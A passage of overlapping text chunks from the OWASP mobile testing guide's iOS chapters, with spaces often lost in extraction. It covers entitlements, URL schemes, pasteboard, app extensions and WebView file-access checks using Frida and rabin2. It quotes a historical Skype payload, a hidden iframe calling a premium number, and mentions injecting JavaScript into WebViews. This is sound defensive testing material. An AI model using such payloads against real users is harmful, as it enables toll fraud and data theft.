usercontroloverit,e.g.tobeabletorevokeaccessortodeleteit. However,sensitivedatamightnotonlybestoredor cachedbutalsosentoverthenetwork. Inbothcases,ithastobeensuredthattheappproperlyfollowstheappropriate bestpractices,whichinthiscaseinvolveimplementingproperdataprotectionandtransportsecurity. Moreinformation onhowtoprotectthiskindofdatacanbefoundinthechapter“NetworkAPIs”. Asyoucansee,usingappcapabilitiesandpermissionsmostlyinvolvehandlingpersonaldata,thereforebeingamatter ofprotectingtheuser’sprivacy. Seethearticles“ProtectingtheUser’sPrivacy”and“AccessingProtectedResources”in AppleDeveloperDocumentationformoredetails. Device Capabilities DevicecapabilitiesareusedbytheAppStoretoensurethatonlycompatibledevicesarelistedandthereforeareallowed todownloadtheapp. TheyarespecifiedintheInfo.plistfileoftheappundertheUIRequiredDeviceCapabilities key. <key>UIRequiredDeviceCapabilities</key> <array> <string>arm64</string> </array> 443\\nTypicallyyou’llfindthearm64capability,meaningthattheappiscompiledforthearm64instructionset. For example, an app might be completely dependent on NFC to work (e.g. a “NFC Tag Reader” app). According to the archived iOS Device Compatibility Reference, NFC is only available starting on the iPhone 7 (and iOS 11). A developer mightwanttoexcludeallincompatibledevicesbysettingthenfcdevicecapability. Regarding testing, you can consider UIRequiredDeviceCapabilities as a mere indication that the app is using some specific resources. Unlike the entitlements related to app capabilities, device capabilities do not confer any right or accesstoprotectedresources. Additionalconfigurationstepsmightberequiredforthat,whichareveryspecifictoeach capability. Forexample,ifBLEisacorefeatureoftheapp,Apple’sCoreBluetoothProgrammingGuideexplainsthedifferentthings tobeconsidered: • Thebluetooth-ledevicecapabilitycanbesetinordertorestrictnon-BLEcapabledevicesfromdownloadingtheir app. • Appcapabilitieslikebluetooth-peripheralorbluetooth-central(bothUIBackgroundModes)shouldbeaddedif BLEbackgroundprocessingisrequired. However, this is not yet enough for the app to get access to the Bluetooth peripheral, the NSBluetoothPeripher-",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 149
    }
  },
  {
    "text": "app is using some specific resources. Unlike the entitlements related to app capabilities, device capabilities do not confer any right or accesstoprotectedresources. Additionalconfigurationstepsmightberequiredforthat,whichareveryspecifictoeach capability. Forexample,ifBLEisacorefeatureoftheapp,Apple’sCoreBluetoothProgrammingGuideexplainsthedifferentthings tobeconsidered: • Thebluetooth-ledevicecapabilitycanbesetinordertorestrictnon-BLEcapabledevicesfromdownloadingtheir app. • Appcapabilitieslikebluetooth-peripheralorbluetooth-central(bothUIBackgroundModes)shouldbeaddedif BLEbackgroundprocessingisrequired. However, this is not yet enough for the app to get access to the Bluetooth peripheral, the NSBluetoothPeripher- alUsageDescriptionkeyhastobeincludedintheInfo.plistfile,meaningthattheuserhastoactivelygivepermission. See“PurposeStringsintheInfo.plistFile”belowformoreinformation. Entitlements AccordingtoApple’siOSSecurityGuide: Entitlementsarekeyvaluepairsthataresignedintoanappandallowauthenticationbeyondruntimefactors,like UNIXuserID.Sinceentitlementsaredigitallysigned,theycan’tbechanged. Entitlementsareusedextensivelyby systemappsanddaemonstoperformspecificprivilegedoperationsthatwouldotherwiserequiretheprocesstorun asroot. Thisgreatlyreducesthepotentialforprivilegeescalationbyacompromisedsystemappordaemon. Manyentitlementscanbesetusingthe“Summary”taboftheXcodetargeteditor. Otherentitlementsrequireeditinga target’sentitlementspropertylistfileorareinheritedfromtheiOSprovisioningprofileusedtoruntheapp. EntitlementSources: 1. Entitlementsembeddedinaprovisioningprofilethatisusedtocodesigntheapp,whicharecomposedof: • CapabilitiesdefinedontheXcodeproject’stargetCapabilitiestab,and/or: • EnabledServicesontheapp’sAppIDwhichareconfiguredontheIdentifierssectionoftheCertificates,ID’s andProfileswebsite. • Otherentitlementsthatareinjectedbytheprofilegenerationservice. 2. Entitlementsfromacodesigningentitlementsfile. EntitlementDestinations: 1. Theapp’ssignature. 2. Theapp’sembeddedprovisioningprofile. TheAppleDeveloperDocumentationalsoexplains: • Duringcodesigning,theentitlementscorrespondingtotheapp’senabledCapabilities/Servicesaretransferredto theapp’ssignaturefromtheprovisioningprofileXcodechosetosigntheapp. • Theprovisioningprofileisembeddedintotheappbundleduringthebuild(embedded.mobileprovision). • Entitlements from the “Code Signing Entitlements” section in Xcode’s “Build Settings” tab are transferred to the app’ssignature. Forexample, ifyouwanttosetthe“DefaultDataProtection”capability, youwouldneedtogototheCapabilitiestab in Xcode and enable Data Protection. This is directly written by Xcode to the <appname>.entitlements file as the com.apple.developer.default-data-protection entitlement with default value NSFileProtectionComplete. In the IPAwemightfindthisintheembedded.mobileprovisionas: 444\\n<key>Entitlements</key> <dict> ... <key>com.apple.developer.default-data-protection</key> <string>NSFileProtectionComplete</string> </dict> For other capabilities such as HealthKit, the user has to be asked for permission, therefore it is not enough to add the entitlements,specialkeysandstringshavetobeaddedtotheInfo.plistfileoftheapp. Purpose Strings in the Info.plist File Purposestringsor_usagedescriptionstrings_arecustomtextsthatareofferedtousersinthesystem’spermissionrequest alertwhenrequestingpermissiontoaccessprotecteddataorresources. IflinkingonorafteriOS10,developersarerequiredtoincludepurposestringsintheirapp’sInfo.plistfile. Otherwise, iftheappattemptstoaccessprotecteddataorresourceswithouthavingprovidedthecorrespondingpurposestring,the accesswillfailandtheappmightevencrash. For an overview of the different purpose strings Info.plist keys available see Table 1-2 at the Apple App Programming GuideforiOS.ClickontheprovidedlinkstoseethefulldescriptionofeachkeyintheCocoaKeysreference. Code Signing Entitlements File Certaincapabilitiesrequireacodesigningentitlementsfile(<appname>.entitlements). Itisautomaticallygeneratedby Xcodebutmaybemanuallyeditedand/orextendedbythedeveloperaswell. Here is an example of entitlements file of the open source app Telegram including the App Groups entitlement (application-groups): <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC\"-//Apple//DTDPLIST1.0//EN\"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict> ... <key>com.apple.security.application-groups</key> <array> <string>group.ph.telegra.Telegraph</string> </array> </dict> ... </plist> Theentitlementoutlinedabovedoesnotrequireanyadditionalpermissionsfromtheuser. However,itisalwaysagood practicetocheckallentitlements,astheappmightoverasktheuserintermsofpermissionsandtherebyleakinforma- tion. 445\\nAsdocumentedatAppleDeveloperDocumentation,theAppGroupsentitlementisrequiredtoshareinformationbetween differentappsthroughIPCorasharedfilecontainer,whichmeansthatdatacanbesharedonthedevicedirectlybetween theapps. Thisentitlementisalsorequiredifanappextensionrequirestoshareinformationwithitscontainingapp. Depending on the data to-be-shared it might be more appropriate to share it using another method such as through a backendwherethisdatacouldbepotentiallyverified,avoidingtamperingbye.g.theuserthemselves. Inter-Process Communication (IPC) Duringimplementationofamobileapplication,developersmayapplytraditionaltechniquesforIPC(suchasusingshared filesornetworksockets). TheIPCsystemfunctionalityofferedbymobileapplicationplatformsshouldbeusedbecauseitis muchmorematurethantraditionaltechniques. UsingIPCmechanismswithnosecurityinmindmaycausetheapplication toleakorexposesensitivedata. In contrast to Android’s rich Inter-Process Communication (IPC) capability, iOS offers some rather limited options for communicationbetweenapps. Infact, there’snowayforappstocommunicatedirectly. Inthissectionwewillpresent thedifferenttypesofindirectcommunicationofferedbyiOSandhowtotestthem. Here’sanoverview: • CustomURLSchemes • UniversalLinks • UIActivitySharing • AppExtensions • UIPasteboard Custom URL Schemes CustomURLschemesallowappstocommunicateviaacustomprotocol. Anappmustdeclaresupportfortheschemes andhandleincomingURLsthatusethoseschemes. ApplewarnsabouttheimproperuseofcustomURLschemesintheAppleDeveloperDocumentation: URLschemesofferapotentialattackvectorintoyourapp,somakesuretovalidateallURLparametersanddiscard anymalformedURLs. Inaddition,limittheavailableactionstothosethatdonotrisktheuser’sdata. Forexample, donotallowotherappstodirectlydeletecontentoraccesssensitiveinformationabouttheuser. Whentestingyour URL-handlingcode,makesureyourtestcasesincludeimproperlyformattedURLs. Theyalsosuggestusinguniversallinksinstead,ifthepurposeistoimplementdeeplinking: WhilecustomURLschemesareanacceptableformofdeeplinking,universallinksarestronglyrecommendedasa bestpractice. SupportingacustomURLschemeisdoneby: • definingtheformatfortheapp’sURLs, • registeringtheschemesothatthesystemdirectsappropriateURLstotheapp, • handlingtheURLsthattheappreceives. SecurityissuesarisewhenanappprocessescallstoitsURLschemewithoutproperlyvalidatingtheURLanditsparameters andwhenusersaren’tpromptedforconfirmationbeforetriggeringanimportantaction. OneexampleisthefollowingbugintheSkypeMobileapp, discoveredin2010: TheSkypeappregisteredtheskype:/ / protocol handler, which allowed other apps to trigger calls to other Skype users and phone numbers. Unfortunately, Skypedidn’taskusersforpermissionbeforeplacingthecalls,soanyappcouldcallarbitrarynumberswithouttheuser’s knowledge. Attackersexploitedthisvulnerabilitybyputtinganinvisible<iframe src=\"skype://xxx?call\"></iframe> (wherexxxwasreplacedbyapremiumnumber),soanySkypeuserwhoinadvertentlyvisitedamaliciouswebsitecalled thepremiumnumber. As a developer, you should carefully validate any URL before calling it. You can allow only certain applications which maybeopenedviatheregisteredprotocolhandler. PromptinguserstoconfirmtheURL-invokedactionisanotherhelpful control. AllURLsarepassedtotheappdelegate,eitheratlaunchtimeorwhiletheappisrunningorinthebackground. Tohandle incomingURLs,thedelegateshouldimplementmethodsto: 446\\n• retrieveinformationabouttheURLanddecidewhetheryouwanttoopenit, • opentheresourcespecifiedbytheURL. MoreinformationcanbefoundinthearchivedAppProgrammingGuideforiOSandintheAppleSecureCodingGuide. Inaddition,anappmayalsowanttosendURLrequests(aka. queries)tootherapps. Thisisdoneby: • registeringtheapplicationqueryschemesthattheappwantstoquery, • optionallyqueryingotherappstoknowiftheycanopenacertainURL, • sendingtheURLrequests. Universal Links UniversallinksaretheiOSequivalenttoAndroidAppLinks(aka. DigitalAssetLinks)andareusedfordeeplinking. When tappingauniversallink(totheapp’swebsite),theuserwillseamlesslyberedirectedtothecorrespondinginstalledapp withoutgoingthroughSafari. Iftheappisn’tinstalled,thelinkwillopeninSafari. Universallinksarestandardweblinks(HTTP/HTTPS)andarenottobeconfusedwithcustomURLschemes,whichoriginally werealsousedfordeeplinking. Forexample,theTelegramappsupportsbothcustomURLschemesanduniversallinks: • tg://resolve?domain=fridadotreisacustomURLschemeandusesthetg://scheme. • https://telegram.me/fridadotreisauniversallinkandusesthehttps://scheme. Both result in the same action, the user will be redirected to the specified chat in Telegram (“fridadotre” in this case). However,universallinksgiveseveralkeybenefitsthatarenotapplicablewhenusingcustomURLschemesandarethe recommendedwaytoimplementdeeplinking,accordingtotheAppleDeveloperDocumentation. Specifically,universal linksare: • Unique: UnlikecustomURLschemes,universallinkscan’tbeclaimedbyotherapps,becausetheyusestandard HTTPorHTTPSlinkstotheapp’swebsite. TheywereintroducedasawaytopreventURLschemehijackingattacks (anappinstalledaftertheoriginalappmaydeclarethesameschemeandthesystemmighttargetallnewrequests tothelastinstalledapp). • Secure: Whenusersinstalltheapp,iOSdownloadsandchecksafile(theAppleAppSiteAssociationorAASA)that wasuploadedtothewebservertomakesurethatthewebsiteallowstheapptoopenURLsonitsbehalf. Onlythe legitimateownersoftheURLcanuploadthisfile,sotheassociationoftheirwebsitewiththeappissecure. • Flexible: Universal links work even when the app is not installed. Tapping a link to the website would open the contentinSafari,asusersexpect. • Simple: OneURLworksforboththewebsiteandtheapp. • Private: Otherappscancommunicatewiththeappwithoutneedingtoknowwhetheritisinstalled. YoucanlearnmoreaboutUniversalLinksinthepost“LearningaboutUniversalLinksandFuzzingURLSchemesoniOS withFrida”byCarlosHolguera. UIActivity Sharing StartingoniOS6itispossibleforthird-partyappstosharedata(items)viaspecificmechanismslikeAirDrop,forexample. Fromauserperspective,thisfeatureisthewell-knownsystem-wide“ShareActivitySheet”thatappearsafterclickingon the“Share”button. 447\\nTheavailablebuilt-insharingmechanisms(aka. ActivityTypes)include: • airDrop • assignToContact • copyToPasteboard • mail • message",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 150
    }
  },
  {
    "text": "wasuploadedtothewebservertomakesurethatthewebsiteallowstheapptoopenURLsonitsbehalf. Onlythe legitimateownersoftheURLcanuploadthisfile,sotheassociationoftheirwebsitewiththeappissecure. • Flexible: Universal links work even when the app is not installed. Tapping a link to the website would open the contentinSafari,asusersexpect. • Simple: OneURLworksforboththewebsiteandtheapp. • Private: Otherappscancommunicatewiththeappwithoutneedingtoknowwhetheritisinstalled. YoucanlearnmoreaboutUniversalLinksinthepost“LearningaboutUniversalLinksandFuzzingURLSchemesoniOS withFrida”byCarlosHolguera. UIActivity Sharing StartingoniOS6itispossibleforthird-partyappstosharedata(items)viaspecificmechanismslikeAirDrop,forexample. Fromauserperspective,thisfeatureisthewell-knownsystem-wide“ShareActivitySheet”thatappearsafterclickingon the“Share”button. 447\\nTheavailablebuilt-insharingmechanisms(aka. ActivityTypes)include: • airDrop • assignToContact • copyToPasteboard • mail • message • postToFacebook • postToTwitter A full list can be found in UIActivity.ActivityType. If not considered appropriate for the app, the developers have the possibilitytoexcludesomeofthesesharingmechanisms. App extensions TogetherwithiOS8,AppleintroducedAppExtensions. AccordingtoAppleAppExtensionProgrammingGuide,appexten- sionsletappsoffercustomfunctionalityandcontenttouserswhilethey’reinteractingwithotherappsorthesystem. In ordertodothis,theyimplementspecific,wellscopedtaskslike,forexample,definewhathappensaftertheuserclickson the“Share”buttonandselectssomeapporaction,providethecontentforaTodaywidgetorenableacustomkeyboard. Dependingonthetask,theappextensionwillhaveaparticulartype(andonlyone),theso-calledextensionpoints. Some notableonesare: • CustomKeyboard: replacestheiOSsystemkeyboardwithacustomkeyboardforuseinallapps. • Share: posttoasharingwebsiteorsharecontentwithothers. • Today: alsocalledwidgets,theyoffercontentorperformquicktasksintheTodayviewofNotificationCenter. How do app extensions interact with other apps Therearethreeimportantelementshere: • Appextension: istheonebundledinsideacontainingapp. Hostappsinteractwithit. • Hostapp: isthe(third-party)appthattriggerstheappextensionofanotherapp. • Containingapp: istheappthatcontainstheappextensionbundledintoit. 448\\nForexample,theuserselectstextinthehostapp,clicksonthe“Share”buttonandselectsone“app”oractionfromthe list. Thistriggerstheappextensionofthecontainingapp. Theappextensiondisplaysitsviewwithinthecontextofthe hostappandusestheitemsprovidedbythehostapp,theselectedtextinthiscase,toperformaspecifictask(postit onasocialnetwork,forexample). SeethispicturefromtheAppleAppExtensionProgrammingGuidewhichprettygood summarizesthis: Security Considerations Fromthesecuritypointofviewitisimportanttonotethat: • Anappextensiondoesnevercommunicatedirectlywithitscontainingapp(typically,itisn’tevenrunningwhilethe containedappextensionisrunning). • Anappextensionandthehostappcommunicateviainter-processcommunication. • Anappextension’scontainingappandthehostappdon’tcommunicateatall. • A Today widget (and no other app extension type) can ask the system to open its containing app by calling the openURL:completionHandler: methodoftheNSExtensionContextclass. • Anyappextensionanditscontainingappcanaccessshareddatainaprivatelydefinedsharedcontainer. Inaddition: • AppextensionscannotaccesssomeAPIs,forexample,HealthKit. • TheycannotreceivedatausingAirDropbutdocansenddata. • Nolong-runningbackgroundtasksareallowedbutuploadsordownloadscanbeinitiated. • AppextensionscannotaccessthecameraormicrophoneonaniOSdevice(exceptforiMessageappextensions). UIPasteboard Whentypingdataintoinputfields,theclipboardcanbeusedtocopyindata. Theclipboardisaccessiblesystem-wideand isthereforesharedbyapps. Thissharingcanbemisusedbymaliciousappstogetsensitivedatathathasbeenstoredin theclipboard. Whenusinganappyoushouldbeawarethatotherappsmightbereadingtheclipboardcontinuously,astheFacebook app did. Before iOS 9, a malicious app might monitor the pasteboard in the background while periodically retrieving [UIPasteboard generalPasteboard].string. AsofiOS9, pasteboardcontentisaccessibletoappsintheforeground only,whichreducestheattacksurfaceofpasswordsniffingfromtheclipboarddramatically. Still,copy-pastingpasswords isasecurityriskyoushouldbeawareof,butalsocannotbesolvedbyanapp. • Preventingpastingintoinputfieldsofanapp,doesnotpreventthatauserwillcopysensitiveinformationanyway. Sincetheinformationhasalreadybeencopiedbeforetheusernoticesthatit’snotpossibletopasteitin,amalicious apphasalreadysniffedtheclipboard. • Ifpastingisdisabledonpasswordfieldsusersmightevenchooseweakerpasswordsthattheycanrememberand they cannot use password managers anymore, which would contradict the original intention of making the app moresecure. The UIPasteboard enables sharing data within an app, and from an app to other apps. There are two kinds of paste- boards: 449\\n• systemwide general pasteboard: for sharing data with any app. Persistent by default across device restarts andappuninstalls(sinceiOS10). • custom/namedpasteboards: forsharingdatawithanotherapp(havingthesameteamIDastheapptoshare from) or with the app itself (they are only available in the process that creates them). Non-persistent by default (sinceiOS10),thatis,theyexistonlyuntiltheowning(creating)appquits. SecurityConsiderations: • Userscannotgrantordenypermissionforappstoreadthepasteboard. • SinceiOS9,appscannotaccessthepasteboardwhileinbackground,thismitigatesbackgroundpasteboardmoni- toring. However,ifthemaliciousappisbroughttoforegroundagainandthedataremainsinthepasteboard,itwill beabletoretrieveitprogrammaticallywithouttheknowledgenortheconsentoftheuser. • Applewarnsaboutpersistentnamedpasteboardsanddiscouragestheiruse. Instead,sharedcontainersshouldbe used. • Starting in iOS 10 there is a new Handoff feature called Universal Clipboard that is enabled by default. It allows the general pasteboard contents to automatically transfer between devices. This feature can be disabled if the developerchoosestodosoanditisalsopossibletosetanexpirationtimeanddateforcopieddata. Testing WebView Protocol Handlers Platform: ios MASVSV1: MSTG-PLATFORM-6 MASVSV2: MASVS-PLATFORM-2 Overview Static Analysis • TestinghowWebViewsareloaded • TestingWebViewfileaccess • Checkingtelephonenumberdetection Testing How WebViews are Loaded IfaWebViewisloadingcontentfromtheappdatadirectory,usersshouldnotbeabletochangethefilenameorpathfrom whichthefileisloaded,andtheyshouldn’tbeabletoedittheloadedfile. This presents an issue especially in UIWebViews loading untrusted content via the deprecated methods loadHTML- String:baseURL:orloadData:MIMEType:textEncodingName: baseURL: andsettingthebaseURLparametertonilor toafile: orapplewebdata: URLschemes. Inthiscase,inordertopreventunauthorizedaccesstolocalfiles,thebest optionistosetitinsteadtoabout:blank. However,therecommendationistoavoidtheuseofUIWebViewsandswitch toWKWebViewsinstead. Here’sanexampleofavulnerableUIWebViewfrom“Where’sMyBrowser?”: letscenario2HtmlPath=Bundle.main.url(forResource:\"web/UIWebView/scenario2.html\",withExtension:nil) do{ letscenario2Html=tryString(contentsOf:scenario2HtmlPath!,encoding:.utf8) uiWebView.loadHTMLString(scenario2Html,baseURL:nil) }catch{} ThepageloadsresourcesfromtheinternetusingHTTP,enablingapotentialMITMtoexfiltratesecretscontainedinlocal files,e.g.insharedpreferences. WhenworkingwithWKWebViews,ApplerecommendsusingloadHTMLString:baseURL:orloadData:MIMEType:textEncodingName:baseURL: to load local HTML files and loadRequest: for web content. Typically, the local files are loaded in combina- tion with methods including, among others: pathForResource:ofType:, URLForResource:withExtension: or init(contentsOf:encoding:). 450\\nSearchthesourcecodeforthementionedmethodsandinspecttheirparameters. ExampleinObjective-C: -(void)viewDidLoad { [super viewDidLoad]; WKWebViewConfiguration *configuration =[[WKWebViewConfigurationalloc]init]; self.webView =[[WKWebViewalloc]initWithFrame:CGRectMake(10,20, CGRectGetWidth([UIScreenmainScreen].bounds)-20, CGRectGetHeight([UIScreenmainScreen].bounds)-84)configuration:configuration]; self.webView.navigationDelegate =self; [self.viewaddSubview:self.webView]; NSString *filePath =[[NSBundlemainBundle]pathForResource:@\"example_file\" ofType:@\"html\"]; NSString *html =[NSStringstringWithContentsOfFile:filePath encoding:NSUTF8StringEncodingerror:nil]; [self.webViewloadHTMLString:htmlbaseURL:[NSBundlemainBundle].resourceURL]; } ExampleinSwiftfrom“Where’sMyBrowser?”: letscenario2HtmlPath=Bundle.main.url(forResource:\"web/WKWebView/scenario2.html\",withExtension:nil) do{ letscenario2Html=tryString(contentsOf:scenario2HtmlPath!,encoding:.utf8) wkWebView.loadHTMLString(scenario2Html,baseURL:nil) }catch{} Ifonlyhavingthecompiledbinary,youcanalsosearchforthesemethods,e.g.: $rabin2 -zz./WheresMyBrowser |grep -i\"loadHTMLString\" 2310x0002df6c24 (4.__TEXT.__objc_methname)asciiloadHTMLString:baseURL: Inacaselikethis,itisrecommendedtoperformdynamicanalysistoensurethatthisisinfactbeingusedandfromwhich kindofWebView. ThebaseURLparameterheredoesn’tpresentanissueasitwillbesetto“null”butcouldbeanissueif notsetproperlywhenusingaUIWebView. See“CheckingHowWebViewsareLoaded”foranexampleaboutthis. In addition, you should also verify if the app is using the method loadFileURL: allowingReadAccessToURL:. Its first parameterisURLandcontainstheURLtobeloadedintheWebView, itssecondparameterallowingReadAccessToURL maycontainasinglefileoradirectory. Ifcontainingasinglefile,thatfilewillbeavailabletotheWebView. However,if itcontainsadirectory,allfilesonthatdirectorywillbemadeavailabletotheWebView. Therefore,itisworthinspecting thisandincaseitisadirectory,verifyingthatnosensitivedatacanbefoundinsideit. ExampleinSwiftfrom“Where’sMyBrowser?”: varscenario1Url=FileManager.default.urls(for:.libraryDirectory,in:.userDomainMask)[0] scenario1Url=scenario1Url.appendingPathComponent(\"WKWebView/scenario1.html\") wkWebView.loadFileURL(scenario1Url,allowingReadAccessTo:scenario1Url) Inthiscase,theparameterallowingReadAccessToURLcontainsasinglefile“WKWebView/scenario1.html”,meaningthat theWebViewhasexclusivelyaccesstothatfile. Inthecompiledbinary: $rabin2 -zz./WheresMyBrowser |grep",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 151
    }
  },
  {
    "text": "letscenario2Html=tryString(contentsOf:scenario2HtmlPath!,encoding:.utf8) wkWebView.loadHTMLString(scenario2Html,baseURL:nil) }catch{} Ifonlyhavingthecompiledbinary,youcanalsosearchforthesemethods,e.g.: $rabin2 -zz./WheresMyBrowser |grep -i\"loadHTMLString\" 2310x0002df6c24 (4.__TEXT.__objc_methname)asciiloadHTMLString:baseURL: Inacaselikethis,itisrecommendedtoperformdynamicanalysistoensurethatthisisinfactbeingusedandfromwhich kindofWebView. ThebaseURLparameterheredoesn’tpresentanissueasitwillbesetto“null”butcouldbeanissueif notsetproperlywhenusingaUIWebView. See“CheckingHowWebViewsareLoaded”foranexampleaboutthis. In addition, you should also verify if the app is using the method loadFileURL: allowingReadAccessToURL:. Its first parameterisURLandcontainstheURLtobeloadedintheWebView, itssecondparameterallowingReadAccessToURL maycontainasinglefileoradirectory. Ifcontainingasinglefile,thatfilewillbeavailabletotheWebView. However,if itcontainsadirectory,allfilesonthatdirectorywillbemadeavailabletotheWebView. Therefore,itisworthinspecting thisandincaseitisadirectory,verifyingthatnosensitivedatacanbefoundinsideit. ExampleinSwiftfrom“Where’sMyBrowser?”: varscenario1Url=FileManager.default.urls(for:.libraryDirectory,in:.userDomainMask)[0] scenario1Url=scenario1Url.appendingPathComponent(\"WKWebView/scenario1.html\") wkWebView.loadFileURL(scenario1Url,allowingReadAccessTo:scenario1Url) Inthiscase,theparameterallowingReadAccessToURLcontainsasinglefile“WKWebView/scenario1.html”,meaningthat theWebViewhasexclusivelyaccesstothatfile. Inthecompiledbinary: $rabin2 -zz./WheresMyBrowser |grep -i\"loadFileURL\" 2370x0002dff137 (4.__TEXT.__objc_methname)asciiloadFileURL:allowingReadAccessToURL: Testing WebView File Access IfyouhavefoundaUIWebViewbeingused,thenthefollowingapplies: • Thefile://schemeisalwaysenabled. • Fileaccessfromfile://URLsisalwaysenabled. • Universalaccessfromfile://URLsisalwaysenabled. RegardingWKWebViews: 451\\n• Thefile://schemeisalsoalwaysenabledanditcannotbedisabled. • Itdisablesfileaccessfromfile://URLsbydefaultbutitcanbeenabled. ThefollowingWebViewpropertiescanbeusedtoconfigurefileaccess: • allowFileAccessFromFileURLs(WKPreferences, falsebydefault): itenablesJavaScriptrunninginthecontext ofafile://schemeURLtoaccesscontentfromotherfile://schemeURLs. • allowUniversalAccessFromFileURLs(WKWebViewConfiguration,falsebydefault): itenablesJavaScriptrunning inthecontextofafile://schemeURLtoaccesscontentfromanyorigin. Forexample,itispossibletosettheundocumentedpropertyallowFileAccessFromFileURLsbydoingthis: Objective-C: [webView.configuration.preferencessetValue:@YESforKey:@\"allowFileAccessFromFileURLs\"]; Swift: webView.configuration.preferences.setValue(true,forKey:\"allowFileAccessFromFileURLs\") Ifoneormoreoftheabovepropertiesareactivated,youshoulddeterminewhethertheyarereallynecessaryfortheapp toworkproperly. Checking Telephone Number Detection In Safari on iOS, telephone number detection is on by default. However, you might want to turn it off if your HTML pagecontainsnumbersthatcanbeinterpretedasphonenumbers,butarenotphonenumbers,ortopreventtheDOM documentfrombeingmodifiedwhenparsedbythebrowser. ToturnofftelephonenumberdetectioninSafarioniOS,use theformat-detectionmetatag(<meta name = \"format-detection\" content = \"telephone=no\">). Anexampleofthis canbefoundintheAppledeveloperdocumentation. Phonelinksshouldbethenused(e.g.<a href=\"tel:1-408-555- 5555\">1-408-555-5555</a>)toexplicitlycreatealink. Dynamic Analysis If it’s possible to load local files via a WebView, the app might be vulnerable to directory traversal attacks. This would allowaccesstoallfileswithinthesandboxoreventoescapethesandboxwithfullaccesstothefilesystem(ifthedevice isjailbroken). Itshouldthereforebeverifiedifausercanchangethefilenameorpathfromwhichthefileisloaded,and theyshouldn’tbeabletoedittheloadedfile. Tosimulateanattack,youmayinjectyourownJavaScriptintotheWebViewwithaninterceptionproxyorsimplybyusing dynamicinstrumentation. Attempttoaccesslocalstorageandanynativemethodsandpropertiesthatmightbeexposed totheJavaScriptcontext. Inareal-worldscenario,JavaScriptcanonlybeinjectedthroughapermanentbackendCross-SiteScriptingvulnerability oraMITMattack. SeetheOWASPXSSPreventionCheatSheetandthechapter“iOSNetworkCommunication”formore information. Forwhatconcernsthissectionwewilllearnabout: • CheckinghowWebViewsareloaded • DeterminingWebViewfileaccess Checking How WebViews are Loaded Aswehaveseenabovein“TestingHowWebViewsareLoaded”,if“scenario2”oftheWKWebViewsisloaded,theappwill dosobycallingURLForResource:withExtension: andloadHTMLString:baseURL. Toquicklyinspectthis,youcanusefrida-traceandtraceall“loadHTMLString”and“URLForResource:withExtension:” meth- ods. 452\\n$frida-trace -U\"Where'sMyBrowser?\" -m\"*[WKWebView*loadHTMLString*]\" -m\"*[*URLForResource:withExtension:]\" 14131ms -[NSBundle URLForResource:0x1c0255390withExtension:0x0] 14131ms URLForResource:web/WKWebView/scenario2.html 14131ms withExtension:0x0 14190ms -[WKWebView loadHTMLString:0x1c0255390baseURL:0x0] 14190ms HTMLString: <!DOCTYPEhtml> <html> ... </html> 14190ms baseURL:nil In this case, baseURL is set to nil, meaning that the effective origin is “null”. You can obtain the effective origin by running window.origin from the JavaScript of the page (this app has an exploitation helper that allows to write and run JavaScript, but you could also implement a MITM or simply use Frida to inject JavaScript, e.g. via evaluate- JavaScript:completionHandlerofWKWebView). AsanadditionalnoteregardingUIWebViews,ifyouretrievetheeffectiveoriginfromaUIWebViewwherebaseURLisalso settonilyouwillseethatitisnotsetto“null”,insteadyou’llobtainsomethingsimilartothefollowing: applewebdata://5361016c-f4a0-4305-816b-65411fc1d780 Thisorigin“applewebdata://”issimilartothe“file://”originasitdoesnotimplementSame-OriginPolicyandallowaccess to local files and any web resources. In this case, it would be better to set baseURL to “about:blank”, this way, the Same-OriginPolicywouldpreventcross-originaccess. However,therecommendationhereistocompletelyavoidusing UIWebViewsandgoforWKWebViewsinstead. Determining WebView File Access Evenifnothavingtheoriginalsourcecode,youcanquicklydetermineiftheapp’sWebViewsdoallowfileaccessandwhich kind. Forthis,simplynavigatetothetargetWebViewintheappandinspectallitsinstances,foreachofthemgetthevalues mentionedinthestaticanalysis,thatis,allowFileAccessFromFileURLsandallowUniversalAccessFromFileURLs. This onlyappliestoWKWebViews(UIWebVIewsalwaysallowfileaccess). Wecontinuewithourexampleusingthe“Where’sMyBrowser?” appandFridaREPL,extendthescriptwiththefollowing content: ObjC.choose(ObjC.classes['WKWebView'],{ onMatch:function (wk){ console.log('onMatch:',wk); console.log('URL:',wk.URL().toString()); console.log('javaScriptEnabled:',wk.configuration().preferences().javaScriptEnabled()); console.log('allowFileAccessFromFileURLs:', wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString()); console.log('hasOnlySecureContent:',wk.hasOnlySecureContent().toString()); console.log('allowUniversalAccessFromFileURLs:', wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString()); }, onComplete:function (){ console.log('doneforWKWebView!'); } }); Ifyourunitnow,you’llhavealltheinformationyouneed: $frida -U-fcom.authenticationfailure.WheresMyBrowser -lwebviews_inspector.js onMatch: <WKWebView:0x1508b1200;frame =(00;320393);layer =<CALayer: 0x1c4238f20>> URL: file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/ Library/WKWebView/scenario1.html javaScriptEnabled: true allowFileAccessFromFileURLs: 0 hasOnlySecureContent: false allowUniversalAccessFromFileURLs: 0 Both allowFileAccessFromFileURLs and allowUniversalAccessFromFileURLs are set to “0”, meaning that they are disabled. InthisappwecangototheWebViewconfigurationandenableallowFileAccessFromFileURLs. Ifwedoso andre-runthescriptwewillseehowitissetto“1”thistime: 453\\n$frida -U-fcom.authenticationfailure.WheresMyBrowser -lwebviews_inspector.js ... allowFileAccessFromFileURLs: 1 Testing App Extensions Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis Thestaticanalysiswilltakecareof: • Verifyingiftheappcontainsappextensions • Determiningthesupporteddatatypes • Checkingdatasharingwiththecontainingapp • Verifyingiftheapprestrictstheuseofappextensions Verifying if the App Contains App Extensions If you have the original source code you can search for all occurrences of NSExtensionPointIdentifier with Xcode (cmd+shift+f)ortakealookinto“BuildPhases/EmbedAppextensions”: Thereyoucanfindthenamesofallembeddedappextensionsfollowedby.appex,nowyoucannavigatetotheindividual appextensionsintheproject. Ifnothavingtheoriginalsourcecode: 